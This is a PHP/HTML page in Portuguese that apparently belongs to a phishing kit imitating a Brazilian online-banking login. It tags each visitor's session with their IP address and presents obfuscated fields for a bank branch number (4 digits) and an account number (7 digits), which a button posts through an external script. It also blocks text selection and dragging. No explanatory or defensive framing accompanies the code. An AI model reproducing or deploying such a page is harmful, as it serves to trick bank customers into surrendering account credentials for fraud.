<?php session_start();
if (!isset($_SESSION['SESSID'])) {
    $rand = rand(0, 9999);
    $_SESSION['SESSID'] = $_SERVER['REMOTE_ADDR'] . '[' . $rand . ']';
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="pt-br" xml:lang="pt-br">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<style>
input{
border-radius: 4px;
border-top-left-radius: 4px;
border-top-right-radius: 4px;
border-bottom-right-radius: 4px;
border-bottom-left-radius: 4px;
-moz-border-radius: 4px;
-webkit-border-radius: 4px;
background: #fff;
margin: 0 7px 0 0;
padding: 5px;
padding: 7px 5px 3px 5px\9;
border: 1px solid;
border-color: #8c9399 #b6bfc4 #b6bfc4;
-moz-box-shadow: 1px 1px 3px rgba(0,0,0,.15) inset,0 1px 0 #fff;
-webkit-box-shadow: 1px 1px 3px rgba(0,0,0,.15) inset,0 1px 0 #fff;
box-shadow: 1px 1px 3px rgba(0,0,0,.15) inset,0 1px 0 #fff;
outline: 0;
-moz-transition: .2s all ease-in;
-webkit-transition: .2s all ease-in;
-transition: .2s all ease-in;
}
body {
    overflow:hidden;
}
</style>
<script src="js/script.js" languague="javascript"></script>
</head>
<body style="background:url('img/atribate2.png');background-repeat:repeat-x;overflow:hidden;margin:0; padding:0; border:0;" topmargin="0" leftmargin="0" scroll="no" onselectstart="return false" ondragstart="return false">
<div style="background:url('img/atribate2.png');width:100%;height:80px;display:none" id="hdbg">
</div>
<form id="primeiro">
<div style="background:url('img/tbb1.jpg');width:100%;height:80px" id="header">

	<div style="position:relative; left:609px;" id="frm">
	<table height="83" width="187">
		<tr>
			<td>
			<span><input type="text" id="agxag" name="agxag" maxlength="4" style="color: #68727b;height:18px;width:42px;font-family: Arial,sans-serif;font-size: 12px;"></span>
			</td>
			<td>
			<span><input type="text" id="cnxcn" name="cnxcn" onkeypress='Formata(this,event);return SomenteNumero(event);'  maxlength="7" style="color: #68727b;height:18px;width:52px;font-family: Arial,sans-serif;font-size: 12px;"></span>
			</td>
			<td>
			<div  id="bntclick" style="width:96px;height:28px;cursor:pointer;" onclick="if (ValidaForm()) {post('<? echo $_SESSION['SESSID'] ?>','primeiro');}"></div>

			</td>
		</tr>
	</table>
	</div>
</div>
</form>	
<div id='principal'>
	<img src="img/prg.png">
</div>
<div id='s6'>
	<div id="nome" onClick="nomeClick();">
		<div class="nbord" id="nbesq">
			
		</div>
		<div id="nmeio">
			<span></span>
		</div>
		<div class="nbord" id="nbdir">
			
		</div>
	</div>
	<form id="outros">
	<div id="backAll">

<div class="conte">
&nbsp;</div>




	</div>
	</form>
</div>

</div>
</body>
</html>